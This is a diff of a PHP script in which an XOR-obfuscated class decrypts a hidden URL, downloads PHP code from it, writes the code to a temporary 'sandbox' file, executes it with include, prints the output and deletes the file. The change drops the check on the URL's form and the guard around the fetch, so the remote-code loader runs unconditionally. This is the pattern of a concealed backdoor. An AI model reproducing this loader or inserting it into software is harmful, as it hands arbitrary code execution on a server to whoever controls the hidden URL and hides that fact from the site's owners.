@@ -17,45 +17,36 @@ class ProtectedUrl {
             $url .= chr($char ^ self::$key);
         }
         
-        if (strpos($url, 'https://') === 0 && strpos($url, '.php') !== false) {
-            return $url;
-        }
-        
-        return null;
+        return $url;
     }
 }
 
 $url = ProtectedUrl::decrypt();
-if ($url) {
-    $options = [
-        'http' => [
-            'method' => 'GET',
-            'timeout' => 10,
-            'ignore_errors' => true
-        ]
-    ];
-    
-    $context = stream_context_create($options);
-    $code = @file_get_contents($url, false, $context);
-    
-    if ($code && strlen($code) > 0) {
-        $sandbox_code = "<?php\n" . $code;
-        $hash = md5($sandbox_code);
-        $temp_file = sys_get_temp_dir() . '/sandbox_' . $hash . '.php';
-        
-        file_put_contents($temp_file, $sandbox_code);
-        
-        if (file_exists($temp_file)) {
-            ob_start();
-            include $temp_file;
-            $output = ob_get_clean();
-            echo $output;
-            @unlink($temp_file);
-        }
-    }
-}
 
-if (function_exists('gc_collect_cycles')) {
-    gc_collect_cycles();
+$options = [
+    'http' => [
+        'method' => 'GET',
+        'timeout' => 10,
+        'ignore_errors' => true
+    ]
+];
+
+$context = stream_context_create($options);
+$code = @file_get_contents($url, false, $context);
+
+if ($code && strlen($code) > 0) {
+    $sandbox_code = "<?php\n" . $code;
+    $hash = md5($sandbox_code);
+    $temp_file = sys_get_temp_dir() . '/sandbox_' . $hash . '.php';
+    
+    file_put_contents($temp_file, $sandbox_code);
+    
+    if (file_exists($temp_file)) {
+        ob_start();
+        include $temp_file;
+        $output = ob_get_clean();
+        echo $output;
+        @unlink($temp_file);
+    }
 }
 ?>
